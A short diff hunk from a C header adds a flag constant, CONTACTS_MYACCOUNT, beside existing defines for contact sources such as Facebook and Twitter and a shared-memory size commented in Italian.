@@ -125,6 +125,8 @@ extern BOOL is_demo_version;
 #define CONTACT_SRC_FACEBOOK 3
 #define CONTACT_SRC_TWITTER  4
 
+#define CONTACTS_MYACCOUNT 0x80000000
+
 //----------------------------------------------------
 
 #define WRAPPER_MAX_SHARED_MEM 0x40 // Dimensione di un blocco di shared mem dedicato
